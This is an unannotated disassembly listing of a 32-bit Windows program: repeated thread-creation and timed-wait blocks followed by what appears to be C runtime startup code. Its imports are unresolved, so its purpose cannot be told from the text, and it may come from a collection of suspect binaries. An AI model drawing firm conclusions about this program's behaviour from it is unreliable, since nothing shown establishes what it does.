  404c85:	6a 00                	push   $0x0
  404c87:	ff 15 a8 60 40 00    	call   *0x4060a8
  404c8d:	6a 64                	push   $0x64
  404c8f:	ff 15 64 60 40 00    	call   *0x406064
  404c95:	6a 00                	push   $0x0
  404c97:	6a 00                	push   $0x0
  404c99:	6a 00                	push   $0x0
  404c9b:	68 90 1b 40 00       	push   $0x401b90
  404ca0:	6a 00                	push   $0x0
  404ca2:	6a 00                	push   $0x0
  404ca4:	ff 15 58 60 40 00    	call   *0x406058
  404caa:	6a 00                	push   $0x0
  404cac:	6a 00                	push   $0x0
  404cae:	6a 00                	push   $0x0
  404cb0:	68 70 42 40 00       	push   $0x404270
  404cb5:	6a 00                	push   $0x0
  404cb7:	6a 00                	push   $0x0
  404cb9:	8b f0                	mov    %eax,%esi
  404cbb:	ff 15 58 60 40 00    	call   *0x406058
  404cc1:	68 20 4e 00 00       	push   $0x4e20
  404cc6:	ff 15 64 60 40 00    	call   *0x406064
  404ccc:	6a 00                	push   $0x0
  404cce:	56                   	push   %esi
  404ccf:	ff d3                	call   *%ebx
  404cd1:	56                   	push   %esi
  404cd2:	ff d7                	call   *%edi
  404cd4:	68 85 00 00 00       	push   $0x85
  404cd9:	6a 00                	push   $0x0
  404cdb:	6a 00                	push   $0x0
  404cdd:	6a 00                	push   $0x0
  404cdf:	ff 15 a8 60 40 00    	call   *0x4060a8
  404ce5:	6a 64                	push   $0x64
  404ce7:	ff 15 64 60 40 00    	call   *0x406064
  404ced:	6a 00                	push   $0x0
  404cef:	6a 00                	push   $0x0
  404cf1:	6a 00                	push   $0x0
  404cf3:	68 40 20 40 00       	push   $0x402040
  404cf8:	6a 00                	push   $0x0
  404cfa:	6a 00                	push   $0x0
  404cfc:	ff 15 58 60 40 00    	call   *0x406058
  404d02:	6a 00                	push   $0x0
  404d04:	6a 00                	push   $0x0
  404d06:	6a 00                	push   $0x0
  404d08:	68 d0 43 40 00       	push   $0x4043d0
  404d0d:	6a 00                	push   $0x0
  404d0f:	6a 00                	push   $0x0
  404d11:	8b f0                	mov    %eax,%esi
  404d13:	ff 15 58 60 40 00    	call   *0x406058
  404d19:	68 20 4e 00 00       	push   $0x4e20
  404d1e:	ff 15 64 60 40 00    	call   *0x406064
  404d24:	6a 00                	push   $0x0
  404d26:	56                   	push   %esi
  404d27:	ff d3                	call   *%ebx
  404d29:	56                   	push   %esi
  404d2a:	ff d7                	call   *%edi
  404d2c:	68 85 00 00 00       	push   $0x85
  404d31:	6a 00                	push   $0x0
  404d33:	6a 00                	push   $0x0
  404d35:	6a 00                	push   $0x0
  404d37:	ff 15 a8 60 40 00    	call   *0x4060a8
  404d3d:	6a 64                	push   $0x64
  404d3f:	ff 15 64 60 40 00    	call   *0x406064
  404d45:	6a 00                	push   $0x0
  404d47:	6a 00                	push   $0x0
  404d49:	6a 00                	push   $0x0
  404d4b:	68 90 26 40 00       	push   $0x402690
  404d50:	6a 00                	push   $0x0
  404d52:	6a 00                	push   $0x0
  404d54:	ff 15 58 60 40 00    	call   *0x406058
  404d5a:	6a 00                	push   $0x0
  404d5c:	6a 00                	push   $0x0
  404d5e:	6a 00                	push   $0x0
  404d60:	68 30 45 40 00       	push   $0x404530
  404d65:	6a 00                	push   $0x0
  404d67:	6a 00                	push   $0x0
  404d69:	8b f0                	mov    %eax,%esi
  404d6b:	ff 15 58 60 40 00    	call   *0x406058
  404d71:	68 20 4e 00 00       	push   $0x4e20
  404d76:	ff 15 64 60 40 00    	call   *0x406064
  404d7c:	6a 00                	push   $0x0
  404d7e:	56                   	push   %esi
  404d7f:	ff d3                	call   *%ebx
  404d81:	56                   	push   %esi
  404d82:	ff d7                	call   *%edi
  404d84:	68 85 00 00 00       	push   $0x85
  404d89:	6a 00                	push   $0x0
  404d8b:	6a 00                	push   $0x0
  404d8d:	6a 00                	push   $0x0
  404d8f:	ff 15 a8 60 40 00    	call   *0x4060a8
  404d95:	6a 64                	push   $0x64
  404d97:	ff 15 64 60 40 00    	call   *0x406064
  404d9d:	6a 00                	push   $0x0
  404d9f:	6a 00                	push   $0x0
  404da1:	6a 00                	push   $0x0
  404da3:	68 80 2b 40 00       	push   $0x402b80
  404da8:	6a 00                	push   $0x0
  404daa:	6a 00                	push   $0x0
  404dac:	ff 15 58 60 40 00    	call   *0x406058
  404db2:	6a 00                	push   $0x0
  404db4:	6a 00                	push   $0x0
  404db6:	6a 00                	push   $0x0
  404db8:	68 90 46 40 00       	push   $0x404690
  404dbd:	8b f0                	mov    %eax,%esi
  404dbf:	6a 00                	push   $0x0
  404dc1:	6a 00                	push   $0x0
  404dc3:	ff 15 58 60 40 00    	call   *0x406058
  404dc9:	68 20 4e 00 00       	push   $0x4e20
  404dce:	ff 15 64 60 40 00    	call   *0x406064
  404dd4:	6a 00                	push   $0x0
  404dd6:	56                   	push   %esi
  404dd7:	ff d3                	call   *%ebx
  404dd9:	56                   	push   %esi
  404dda:	ff d7                	call   *%edi
  404ddc:	68 85 00 00 00       	push   $0x85
  404de1:	6a 00                	push   $0x0
  404de3:	6a 00                	push   $0x0
  404de5:	6a 00                	push   $0x0
  404de7:	ff 15 a8 60 40 00    	call   *0x4060a8
  404ded:	6a 64                	push   $0x64
  404def:	ff 15 64 60 40 00    	call   *0x406064
  404df5:	6a 00                	push   $0x0
  404df7:	6a 00                	push   $0x0
  404df9:	6a 00                	push   $0x0
  404dfb:	68 60 31 40 00       	push   $0x403160
  404e00:	6a 00                	push   $0x0
  404e02:	6a 00                	push   $0x0
  404e04:	ff 15 58 60 40 00    	call   *0x406058
  404e0a:	6a 00                	push   $0x0
  404e0c:	6a 00                	push   $0x0
  404e0e:	6a 00                	push   $0x0
  404e10:	68 40 48 40 00       	push   $0x404840
  404e15:	6a 00                	push   $0x0
  404e17:	6a 00                	push   $0x0
  404e19:	8b f0                	mov    %eax,%esi
  404e1b:	ff 15 58 60 40 00    	call   *0x406058
  404e21:	68 20 4e 00 00       	push   $0x4e20
  404e26:	ff 15 64 60 40 00    	call   *0x406064
  404e2c:	6a 00                	push   $0x0
  404e2e:	56                   	push   %esi
  404e2f:	ff d3                	call   *%ebx
  404e31:	56                   	push   %esi
  404e32:	ff d7                	call   *%edi
  404e34:	68 85 00 00 00       	push   $0x85
  404e39:	6a 00                	push   $0x0
  404e3b:	6a 00                	push   $0x0
  404e3d:	6a 00                	push   $0x0
  404e3f:	ff 15 a8 60 40 00    	call   *0x4060a8
  404e45:	6a 64                	push   $0x64
  404e47:	ff 15 64 60 40 00    	call   *0x406064
  404e4d:	6a 00                	push   $0x0
  404e4f:	6a 00                	push   $0x0
  404e51:	6a 00                	push   $0x0
  404e53:	68 e0 38 40 00       	push   $0x4038e0
  404e58:	6a 00                	push   $0x0
  404e5a:	6a 00                	push   $0x0
  404e5c:	ff 15 58 60 40 00    	call   *0x406058
  404e62:	6a 00                	push   $0x0
  404e64:	6a 00                	push   $0x0
  404e66:	6a 00                	push   $0x0
  404e68:	68 80 49 40 00       	push   $0x404980
  404e6d:	6a 00                	push   $0x0
  404e6f:	6a 00                	push   $0x0
  404e71:	8b f0                	mov    %eax,%esi
  404e73:	ff 15 58 60 40 00    	call   *0x406058
  404e79:	68 20 4e 00 00       	push   $0x4e20
  404e7e:	ff 15 64 60 40 00    	call   *0x406064
  404e84:	6a 00                	push   $0x0
  404e86:	56                   	push   %esi
  404e87:	ff d3                	call   *%ebx
  404e89:	56                   	push   %esi
  404e8a:	ff d7                	call   *%edi
  404e8c:	8b 75 fc             	mov    -0x4(%ebp),%esi
  404e8f:	6a 00                	push   $0x0
  404e91:	56                   	push   %esi
  404e92:	ff d3                	call   *%ebx
  404e94:	56                   	push   %esi
  404e95:	ff d7                	call   *%edi
  404e97:	8b 75 f8             	mov    -0x8(%ebp),%esi
  404e9a:	6a 00                	push   $0x0
  404e9c:	56                   	push   %esi
  404e9d:	ff d3                	call   *%ebx
  404e9f:	56                   	push   %esi
  404ea0:	ff d7                	call   *%edi
  404ea2:	68 85 00 00 00       	push   $0x85
  404ea7:	6a 00                	push   $0x0
  404ea9:	6a 00                	push   $0x0
  404eab:	6a 00                	push   $0x0
  404ead:	ff 15 a8 60 40 00    	call   *0x4060a8
  404eb3:	6a 64                	push   $0x64
  404eb5:	ff 15 64 60 40 00    	call   *0x406064
  404ebb:	5f                   	pop    %edi
  404ebc:	5e                   	pop    %esi
  404ebd:	5b                   	pop    %ebx
  404ebe:	8b e5                	mov    %ebp,%esp
  404ec0:	5d                   	pop    %ebp
  404ec1:	c2 10 00             	ret    $0x10
  404ec4:	3b 0d 08 80 40 00    	cmp    0x408008,%ecx
  404eca:	f2 75 02             	bnd jne 0x404ecf
  404ecd:	f2 c3                	bnd ret
  404ecf:	f2 e9 94 04 00 00    	bnd jmp 0x405369
  404ed5:	53                   	push   %ebx
  404ed6:	56                   	push   %esi
  404ed7:	57                   	push   %edi
  404ed8:	6a 00                	push   $0x0
  404eda:	68 a0 0f 00 00       	push   $0xfa0
  404edf:	68 38 80 40 00       	push   $0x408038
  404ee4:	e8 65 0d 00 00       	call   0x405c4e
  404ee9:	83 c4 0c             	add    $0xc,%esp
  404eec:	68 d0 61 40 00       	push   $0x4061d0
  404ef1:	ff 15 8c 60 40 00    	call   *0x40608c
  404ef7:	8b f0                	mov    %eax,%esi
  404ef9:	85 f6                	test   %esi,%esi
  404efb:	0f 84 8c 00 00 00    	je     0x404f8d
  404f01:	68 ec 61 40 00       	push   $0x4061ec
  404f06:	56                   	push   %esi
  404f07:	ff 15 88 60 40 00    	call   *0x406088
  404f0d:	68 08 62 40 00       	push   $0x406208
  404f12:	56                   	push   %esi
  404f13:	8b d8                	mov    %eax,%ebx
  404f15:	ff 15 88 60 40 00    	call   *0x406088
  404f1b:	68 24 62 40 00       	push   $0x406224
  404f20:	56                   	push   %esi
  404f21:	8b f8                	mov    %eax,%edi
  404f23:	ff 15 88 60 40 00    	call   *0x406088
  404f29:	8b f0                	mov    %eax,%esi
  404f2b:	85 db                	test   %ebx,%ebx
  404f2d:	74 37                	je     0x404f66
  404f2f:	85 ff                	test   %edi,%edi
  404f31:	74 33                	je     0x404f66
  404f33:	85 f6                	test   %esi,%esi
  404f35:	74 2f                	je     0x404f66
  404f37:	83 25 54 80 40 00 00 	andl   $0x0,0x408054
  404f3e:	8b cb                	mov    %ebx,%ecx
  404f40:	68 50 80 40 00       	push   $0x408050
  404f45:	e8 61 09 00 00       	call   0x4058ab
  404f4a:	ff d3                	call   *%ebx
  404f4c:	57                   	push   %edi
  404f4d:	e8 43 00 00 00       	call   0x404f95
  404f52:	56                   	push   %esi
  404f53:	a3 58 80 40 00       	mov    %eax,0x408058
  404f58:	e8 38 00 00 00       	call   0x404f95
  404f5d:	59                   	pop    %ecx
  404f5e:	59                   	pop    %ecx
  404f5f:	a3 5c 80 40 00       	mov    %eax,0x40805c
  404f64:	eb 16                	jmp    0x404f7c
  404f66:	33 c0                	xor    %eax,%eax
  404f68:	50                   	push   %eax
  404f69:	50                   	push   %eax
  404f6a:	6a 01                	push   $0x1
  404f6c:	50                   	push   %eax
  404f6d:	ff 15 90 60 40 00    	call   *0x406090
  404f73:	a3 54 80 40 00       	mov    %eax,0x408054
  404f78:	85 c0                	test   %eax,%eax
  404f7a:	74 11                	je     0x404f8d
  404f7c:	68 b2 4f 40 00       	push   $0x404fb2
  404f81:	e8 31 07 00 00       	call   0x4056b7
  404f86:	59                   	pop    %ecx
  404f87:	5f                   	pop    %edi
  404f88:	5e                   	pop    %esi
  404f89:	33 c0                	xor    %eax,%eax
  404f8b:	5b                   	pop    %ebx
  404f8c:	c3                   	ret
  404f8d:	6a 07                	push   $0x7
  404f8f:	e8 38 07 00 00       	call   0x4056cc
  404f94:	cc                   	int3
  404f95:	55                   	push   %ebp
  404f96:	8b ec                	mov    %esp,%ebp
  404f98:	a1 08 80 40 00       	mov    0x408008,%eax
  404f9d:	83 e0 1f             	and    $0x1f,%eax
  404fa0:	6a 20                	push   $0x20
  404fa2:	59                   	pop    %ecx
  404fa3:	2b c8                	sub    %eax,%ecx
  404fa5:	8b 45 08             	mov    0x8(%ebp),%eax
  404fa8:	d3 c8                	ror    %cl,%eax
  404faa:	33 05 08 80 40 00    	xor    0x408008,%eax
  404fb0:	5d                   	pop    %ebp
  404fb1:	c3                   	ret
  404fb2:	68 38 80 40 00       	push   $0x408038
  404fb7:	ff 15 78 60 40 00    	call   *0x406078
  404fbd:	a1 54 80 40 00       	mov    0x408054,%eax
  404fc2:	85 c0                	test   %eax,%eax
  404fc4:	74 07                	je     0x404fcd
  404fc6:	50                   	push   %eax
  404fc7:	ff 15 5c 60 40 00    	call   *0x40605c
  404fcd:	c3                   	ret
  404fce:	55                   	push   %ebp
  404fcf:	8b ec                	mov    %esp,%ebp
  404fd1:	e8 7d 00 00 00       	call   0x405053
  404fd6:	8b 0d 00 80 40 00    	mov    0x408000,%ecx
  404fdc:	8b 45 08             	mov    0x8(%ebp),%eax
  404fdf:	41                   	inc    %ecx
  404fe0:	89 0d 00 80 40 00    	mov    %ecx,0x408000
  404fe6:	89 08                	mov    %ecx,(%eax)
  404fe8:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  404fee:	8b 0d a4 83 40 00    	mov    0x4083a4,%ecx
  404ff4:	8b 0c 88             	mov    (%eax,%ecx,4),%ecx
  404ff7:	a1 00 80 40 00       	mov    0x408000,%eax
  404ffc:	89 81 04 00 00 00    	mov    %eax,0x4(%ecx)
  405002:	e8 99 00 00 00       	call   0x4050a0
  405007:	5d                   	pop    %ebp
  405008:	e9 52 00 00 00       	jmp    0x40505f
  40500d:	55                   	push   %ebp
  40500e:	8b ec                	mov    %esp,%ebp
  405010:	56                   	push   %esi
  405011:	e8 3d 00 00 00       	call   0x405053
  405016:	8b 75 08             	mov    0x8(%ebp),%esi
  405019:	eb 08                	jmp    0x405023
  40501b:	6a 64                	push   $0x64
  40501d:	e8 8a 00 00 00       	call   0x4050ac
  405022:	59                   	pop    %ecx
  405023:	83 3e 00             	cmpl   $0x0,(%esi)
  405026:	74 21                	je     0x405049
  405028:	83 3e ff             	cmpl   $0xffffffff,(%esi)
  40502b:	74 ee                	je     0x40501b
  40502d:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  405033:	8b 0d a4 83 40 00    	mov    0x4083a4,%ecx
  405039:	8b 0c 88             	mov    (%eax,%ecx,4),%ecx
  40503c:	a1 00 80 40 00       	mov    0x408000,%eax
  405041:	89 81 04 00 00 00    	mov    %eax,0x4(%ecx)
  405047:	eb 03                	jmp    0x40504c
  405049:	83 0e ff             	orl    $0xffffffff,(%esi)
  40504c:	5e                   	pop    %esi
  40504d:	5d                   	pop    %ebp
  40504e:	e9 4d 00 00 00       	jmp    0x4050a0
  405053:	68 38 80 40 00       	push   $0x408038
  405058:	ff 15 70 60 40 00    	call   *0x406070
  40505e:	c3                   	ret
  40505f:	a1 54 80 40 00       	mov    0x408054,%eax
  405064:	85 c0                	test   %eax,%eax
  405066:	75 24                	jne    0x40508c
  405068:	56                   	push   %esi
  405069:	8b 35 08 80 40 00    	mov    0x408008,%esi
  40506f:	8b ce                	mov    %esi,%ecx
  405071:	33 35 5c 80 40 00    	xor    0x40805c,%esi
  405077:	83 e1 1f             	and    $0x1f,%ecx
  40507a:	d3 ce                	ror    %cl,%esi
  40507c:	68 50 80 40 00       	push   $0x408050
  405081:	8b ce                	mov    %esi,%ecx
  405083:	e8 23 08 00 00       	call   0x4058ab
  405088:	ff d6                	call   *%esi
  40508a:	5e                   	pop    %esi
  40508b:	c3                   	ret
  40508c:	50                   	push   %eax
  40508d:	ff 15 7c 60 40 00    	call   *0x40607c
  405093:	ff 35 54 80 40 00    	push   0x408054
  405099:	ff 15 80 60 40 00    	call   *0x406080
  40509f:	c3                   	ret
  4050a0:	68 38 80 40 00       	push   $0x408038
  4050a5:	ff 15 74 60 40 00    	call   *0x406074
  4050ab:	c3                   	ret
  4050ac:	55                   	push   %ebp
  4050ad:	8b ec                	mov    %esp,%ebp
  4050af:	83 3d 54 80 40 00 00 	cmpl   $0x0,0x408054
  4050b6:	56                   	push   %esi
  4050b7:	75 31                	jne    0x4050ea
  4050b9:	8b 35 08 80 40 00    	mov    0x408008,%esi
  4050bf:	8b ce                	mov    %esi,%ecx
  4050c1:	ff 75 08             	push   0x8(%ebp)
  4050c4:	33 35 58 80 40 00    	xor    0x408058,%esi
  4050ca:	83 e1 1f             	and    $0x1f,%ecx
  4050cd:	d3 ce                	ror    %cl,%esi
  4050cf:	68 38 80 40 00       	push   $0x408038
  4050d4:	68 50 80 40 00       	push   $0x408050
  4050d9:	8b ce                	mov    %esi,%ecx
  4050db:	e8 cb 07 00 00       	call   0x4058ab
  4050e0:	ff d6                	call   *%esi
  4050e2:	f7 d8                	neg    %eax
  4050e4:	1b c0                	sbb    %eax,%eax
  4050e6:	f7 d8                	neg    %eax
  4050e8:	eb 24                	jmp    0x40510e
  4050ea:	e8 b1 ff ff ff       	call   0x4050a0
  4050ef:	6a 00                	push   $0x0
  4050f1:	ff 75 08             	push   0x8(%ebp)
  4050f4:	ff 35 54 80 40 00    	push   0x408054
  4050fa:	ff 15 84 60 40 00    	call   *0x406084
  405100:	8b f0                	mov    %eax,%esi
  405102:	e8 4c ff ff ff       	call   0x405053
  405107:	33 c0                	xor    %eax,%eax
  405109:	85 f6                	test   %esi,%esi
  40510b:	0f 94 c0             	sete   %al
  40510e:	5e                   	pop    %esi
  40510f:	5d                   	pop    %ebp
  405110:	c3                   	ret
  405111:	56                   	push   %esi
  405112:	6a 02                	push   $0x2
  405114:	e8 4d 0b 00 00       	call   0x405c66
  405119:	e8 36 08 00 00       	call   0x405954
  40511e:	50                   	push   %eax
  40511f:	e8 78 0b 00 00       	call   0x405c9c
  405124:	e8 97 0b 00 00       	call   0x405cc0
  405129:	8b f0                	mov    %eax,%esi
  40512b:	e8 21 08 00 00       	call   0x405951
  405130:	6a 01                	push   $0x1
  405132:	89 06                	mov    %eax,(%esi)
  405134:	e8 dd 03 00 00       	call   0x405516
  405139:	83 c4 0c             	add    $0xc,%esp
  40513c:	5e                   	pop    %esi
  40513d:	84 c0                	test   %al,%al
  40513f:	74 6c                	je     0x4051ad
  405141:	db e2                	fnclex
  405143:	e8 81 08 00 00       	call   0x4059c9
  405148:	68 f4 59 40 00       	push   $0x4059f4
  40514d:	e8 65 05 00 00       	call   0x4056b7
  405152:	e8 f6 07 00 00       	call   0x40594d
  405157:	50                   	push   %eax
  405158:	e8 15 0b 00 00       	call   0x405c72
  40515d:	59                   	pop    %ecx
  40515e:	59                   	pop    %ecx
  40515f:	85 c0                	test   %eax,%eax
  405161:	75 4a                	jne    0x4051ad
  405163:	e8 f2 07 00 00       	call   0x40595a
  405168:	e8 44 08 00 00       	call   0x4059b1
  40516d:	85 c0                	test   %eax,%eax
  40516f:	74 0b                	je     0x40517c
  405171:	68 51 59 40 00       	push   $0x405951
  405176:	e8 f1 0a 00 00       	call   0x405c6c
  40517b:	59                   	pop    %ecx
  40517c:	e8 06 08 00 00       	call   0x405987
  405181:	e8 01 08 00 00       	call   0x405987
  405186:	e8 db 07 00 00       	call   0x405966
  40518b:	e8 c1 07 00 00       	call   0x405951
  405190:	50                   	push   %eax
  405191:	e8 1e 0b 00 00       	call   0x405cb4
  405196:	59                   	pop    %ecx
  405197:	e8 4e 0b 00 00       	call   0x405cea
  40519c:	84 c0                	test   %al,%al
  40519e:	74 05                	je     0x4051a5
  4051a0:	e8 d3 0a 00 00       	call   0x405c78
  4051a5:	e8 a7 07 00 00       	call   0x405951
  4051aa:	33 c0                	xor    %eax,%eax
  4051ac:	c3                   	ret
  4051ad:	6a 07                	push   $0x7
  4051af:	e8 18 05 00 00       	call   0x4056cc
  4051b4:	cc                   	int3
  4051b5:	e8 da 07 00 00       	call   0x405994
  4051ba:	33 c0                	xor    %eax,%eax
  4051bc:	c3                   	ret
  4051bd:	e8 9c 06 00 00       	call   0x40585e
  4051c2:	e8 8a 07 00 00       	call   0x405951
  4051c7:	50                   	push   %eax
  4051c8:	e8 ed 0a 00 00       	call   0x405cba
  4051cd:	59                   	pop    %ecx
  4051ce:	c3                   	ret
  4051cf:	6a 14                	push   $0x14
  4051d1:	68 f0 68 40 00       	push   $0x4068f0
  4051d6:	e8 45 08 00 00       	call   0x405a20
  4051db:	6a 01                	push   $0x1
  4051dd:	e8 fb 02 00 00       	call   0x4054dd
  4051e2:	59                   	pop    %ecx
  4051e3:	84 c0                	test   %al,%al
  4051e5:	75 07                	jne    0x4051ee
  4051e7:	6a 07                	push   $0x7
  4051e9:	e8 de 04 00 00       	call   0x4056cc
  4051ee:	32 db                	xor    %bl,%bl
  4051f0:	88 5d e7             	mov    %bl,-0x19(%ebp)
  4051f3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4051f7:	e8 ac 02 00 00       	call   0x4054a8
  4051fc:	88 45 dc             	mov    %al,-0x24(%ebp)
  4051ff:	a1 7c 83 40 00       	mov    0x40837c,%eax
  405204:	33 c9                	xor    %ecx,%ecx
  405206:	41                   	inc    %ecx
  405207:	3b c1                	cmp    %ecx,%eax
  405209:	74 dc                	je     0x4051e7
  40520b:	85 c0                	test   %eax,%eax
  40520d:	75 49                	jne    0x405258
  40520f:	89 0d 7c 83 40 00    	mov    %ecx,0x40837c
  405215:	68 a8 61 40 00       	push   $0x4061a8
  40521a:	68 98 61 40 00       	push   $0x406198
  40521f:	e8 66 0a 00 00       	call   0x405c8a
  405224:	59                   	pop    %ecx
  405225:	59                   	pop    %ecx
  405226:	85 c0                	test   %eax,%eax
  405228:	74 11                	je     0x40523b
  40522a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405231:	b8 ff 00 00 00       	mov    $0xff,%eax
  405236:	e9 f6 00 00 00       	jmp    0x405331
  40523b:	68 94 61 40 00       	push   $0x406194
  405240:	68 8c 61 40 00       	push   $0x40618c
  405245:	e8 3a 0a 00 00       	call   0x405c84
  40524a:	59                   	pop    %ecx
  40524b:	59                   	pop    %ecx
  40524c:	c7 05 7c 83 40 00 02 	movl   $0x2,0x40837c
  405253:	00 00 00 
  405256:	eb 05                	jmp    0x40525d
  405258:	8a d9                	mov    %cl,%bl
  40525a:	88 5d e7             	mov    %bl,-0x19(%ebp)
  40525d:	ff 75 dc             	push   -0x24(%ebp)
  405260:	e8 d2 03 00 00       	call   0x405637
  405265:	59                   	pop    %ecx
  405266:	e8 52 07 00 00       	call   0x4059bd
  40526b:	8b f0                	mov    %eax,%esi
  40526d:	33 ff                	xor    %edi,%edi
  40526f:	39 3e                	cmp    %edi,(%esi)
  405271:	74 1a                	je     0x40528d
  405273:	56                   	push   %esi
  405274:	e8 34 03 00 00       	call   0x4055ad
  405279:	59                   	pop    %ecx
  40527a:	84 c0                	test   %al,%al
  40527c:	74 0f                	je     0x40528d
  40527e:	57                   	push   %edi
  40527f:	6a 02                	push   $0x2
  405281:	57                   	push   %edi
  405282:	8b 36                	mov    (%esi),%esi
  405284:	8b ce                	mov    %esi,%ecx
  405286:	e8 20 06 00 00       	call   0x4058ab
  40528b:	ff d6                	call   *%esi
  40528d:	e8 31 07 00 00       	call   0x4059c3
  405292:	8b f0                	mov    %eax,%esi
  405294:	39 3e                	cmp    %edi,(%esi)
  405296:	74 13                	je     0x4052ab
  405298:	56                   	push   %esi
  405299:	e8 0f 03 00 00       	call   0x4055ad
  40529e:	59                   	pop    %ecx
  40529f:	84 c0                	test   %al,%al
  4052a1:	74 08                	je     0x4052ab
  4052a3:	ff 36                	push   (%esi)
  4052a5:	e8 04 0a 00 00       	call   0x405cae
  4052aa:	59                   	pop    %ecx
  4052ab:	e8 37 05 00 00       	call   0x4057e7
  4052b0:	0f b7 c0             	movzwl %ax,%eax
  4052b3:	50                   	push   %eax
  4052b4:	e8 c5 09 00 00       	call   0x405c7e
  4052b9:	50                   	push   %eax
  4052ba:	57                   	push   %edi
  4052bb:	68 00 00 40 00       	push   $0x400000
  4052c0:	e8 db f7 ff ff       	call   0x404aa0
  4052c5:	8b f0                	mov    %eax,%esi
  4052c7:	e8 4e 05 00 00       	call   0x40581a
  4052cc:	84 c0                	test   %al,%al
  4052ce:	75 06                	jne    0x4052d6
  4052d0:	56                   	push   %esi
  4052d1:	e8 ba 09 00 00       	call   0x405c90
  4052d6:	84 db                	test   %bl,%bl
  4052d8:	75 05                	jne    0x4052df
  4052da:	e8 c3 09 00 00       	call   0x405ca2
  4052df:	57                   	push   %edi
  4052e0:	6a 01                	push   $0x1
  4052e2:	e8 6d 03 00 00       	call   0x405654
  4052e7:	59                   	pop    %ecx
  4052e8:	59                   	pop    %ecx
  4052e9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4052f0:	8b c6                	mov    %esi,%eax
  4052f2:	eb 3d                	jmp    0x405331
  4052f4:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4052f7:	8b 01                	mov    (%ecx),%eax
  4052f9:	8b 00                	mov    (%eax),%eax
  4052fb:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4052fe:	51                   	push   %ecx
  4052ff:	50                   	push   %eax
  405300:	e8 5b 09 00 00       	call   0x405c60
  405305:	59                   	pop    %ecx
  405306:	59                   	pop    %ecx
  405307:	c3                   	ret
  405308:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40530b:	e8 0a 05 00 00       	call   0x40581a
  405310:	84 c0                	test   %al,%al
  405312:	75 08                	jne    0x40531c
  405314:	ff 75 e0             	push   -0x20(%ebp)
  405317:	e8 7a 09 00 00       	call   0x405c96
  40531c:	80 7d e7 00          	cmpb   $0x0,-0x19(%ebp)
  405320:	75 05                	jne    0x405327
  405322:	e8 81 09 00 00       	call   0x405ca8
  405327:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40532e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  405331:	e8 30 07 00 00       	call   0x405a66
  405336:	c3                   	ret
  405337:	e8 75 05 00 00       	call   0x4058b1
  40533c:	e9 8e fe ff ff       	jmp    0x4051cf
  405341:	55                   	push   %ebp
  405342:	8b ec                	mov    %esp,%ebp
  405344:	6a 00                	push   $0x0
  405346:	ff 15 48 60 40 00    	call   *0x406048
  40534c:	ff 75 08             	push   0x8(%ebp)
  40534f:	ff 15 4c 60 40 00    	call   *0x40604c
  405355:	68 09 04 00 c0       	push   $0xc0000409
  40535a:	ff 15 44 60 40 00    	call   *0x406044
  405360:	50                   	push   %eax
  405361:	ff 15 40 60 40 00    	call   *0x406040
  405367:	5d                   	pop    %ebp
  405368:	c3                   	ret
  405369:	55                   	push   %ebp
  40536a:	8b ec                	mov    %esp,%ebp
  40536c:	81 ec 24 03 00 00    	sub    $0x324,%esp
  405372:	6a 17                	push   $0x17
  405374:	e8 6b 09 00 00       	call   0x405ce4
  405379:	85 c0                	test   %eax,%eax
  40537b:	74 05                	je     0x405382
  40537d:	6a 02                	push   $0x2
  40537f:	59                   	pop    %ecx
  405380:	cd 29                	int    $0x29
  405382:	a3 60 81 40 00       	mov    %eax,0x408160
  405387:	89 0d 5c 81 40 00    	mov    %ecx,0x40815c
  40538d:	89 15 58 81 40 00    	mov    %edx,0x408158
  405393:	89 1d 54 81 40 00    	mov    %ebx,0x408154
  405399:	89 35 50 81 40 00    	mov    %esi,0x408150
  40539f:	89 3d 4c 81 40 00    	mov    %edi,0x40814c
  4053a5:	66 8c 15 78 81 40 00 	data16 mov %ss,0x408178
  4053ac:	66 8c 0d 6c 81 40 00 	data16 mov %cs,0x40816c
  4053b3:	66 8c 1d 48 81 40 00 	data16 mov %ds,0x408148
  4053ba:	66 8c 05 44 81 40 00 	data16 mov %es,0x408144
  4053c1:	66 8c 25 40 81 40 00 	data16 mov %fs,0x408140
  4053c8:	66 8c 2d 3c 81 40 00 	data16 mov %gs,0x40813c
  4053cf:	9c                   	pushf
  4053d0:	8f 05 70 81 40 00    	pop    0x408170
  4053d6:	8b 45 00             	mov    0x0(%ebp),%eax
  4053d9:	a3 64 81 40 00       	mov    %eax,0x408164
  4053de:	8b 45 04             	mov    0x4(%ebp),%eax
  4053e1:	a3 68 81 40 00       	mov    %eax,0x408168
  4053e6:	8d 45 08             	lea    0x8(%ebp),%eax
  4053e9:	a3 74 81 40 00       	mov    %eax,0x408174
  4053ee:	8b 85 dc fc ff ff    	mov    -0x324(%ebp),%eax
  4053f4:	c7 05 b0 80 40 00 01 	movl   $0x10001,0x4080b0
  4053fb:	00 01 00 
  4053fe:	a1 68 81 40 00       	mov    0x408168,%eax
  405403:	a3 6c 80 40 00       	mov    %eax,0x40806c
  405408:	c7 05 60 80 40 00 09 	movl   $0xc0000409,0x408060
  40540f:	04 00 c0 
  405412:	c7 05 64 80 40 00 01 	movl   $0x1,0x408064
  405419:	00 00 00 
  40541c:	c7 05 70 80 40 00 01 	movl   $0x1,0x408070
  405423:	00 00 00 
  405426:	6a 04                	push   $0x4
  405428:	58                   	pop    %eax
  405429:	6b c0 00             	imul   $0x0,%eax,%eax
  40542c:	c7 80 74 80 40 00 02 	movl   $0x2,0x408074(%eax)
  405433:	00 00 00 
  405436:	6a 04                	push   $0x4
  405438:	58                   	pop    %eax
  405439:	6b c0 00             	imul   $0x0,%eax,%eax
  40543c:	8b 0d 08 80 40 00    	mov    0x408008,%ecx
  405442:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  405446:	6a 04                	push   $0x4
  405448:	58                   	pop    %eax
  405449:	c1 e0 00             	shl    $0x0,%eax
  40544c:	8b 0d 04 80 40 00    	mov    0x408004,%ecx
  405452:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  405456:	68 40 62 40 00       	push   $0x406240
